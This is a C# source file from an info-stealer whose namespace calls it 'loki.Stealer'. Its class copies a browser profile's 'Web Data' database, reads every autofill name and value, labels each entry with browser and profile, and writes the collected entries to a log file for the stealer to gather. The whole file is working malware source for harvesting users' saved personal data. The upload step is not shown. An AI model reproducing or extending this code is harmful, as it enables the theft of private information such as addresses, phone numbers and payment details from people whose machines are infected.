using System;
using System.Collections.Generic;
using System.IO;
using loki.loki.Stealer.Cookies;
using loki.sqlite;

namespace loki.loki.Stealer.WebData;

internal class Get_Browser_Autofill
{
	public static List<string> Autofill_List = new List<string>();

	public static List<string> Autofill = new List<string>();

	public static int AutofillCount;

	public static void get_Autofill(string profilePath, string browser_name, string profile_name)
	{
		try
		{
			string filePath = Path.Combine(profilePath, "Web Data");
			CNT cNT = new CNT(GetCookies.CreateTempCopy(filePath));
			cNT.ReadTable("autofill");
			for (int i = 0; i < cNT.RowLength; i++)
			{
				AutofillCount++;
				try
				{
					Autofill.Add("Name : " + cNT.ParseValue(i, "name").Trim() + Environment.NewLine + "Value : " + cNT.ParseValue(i, "value").Trim());
				}
				catch
				{
				}
			}
			for (int j = 0; j < Autofill.Count; j++)
			{
				Autofill_List.Add("Browser : " + browser_name + Environment.NewLine + "Profile : " + profile_name + Environment.NewLine + Autofill[j] + Environment.NewLine);
			}
			Autofill.Clear();
		}
		catch
		{
		}
	}

	public static void Write_Autofill(string Browser_Name, string Profile_Name)
	{
		using StreamWriter streamWriter = new StreamWriter(Program.dir + "\\Browsers\\" + Profile_Name + "_" + Browser_Name + "_Autofill.log");
		for (int i = 0; i < Autofill_List.Count; i++)
		{
			streamWriter.Write(Autofill_List[i]);
			streamWriter.Write(Environment.NewLine);
		}
	}
}
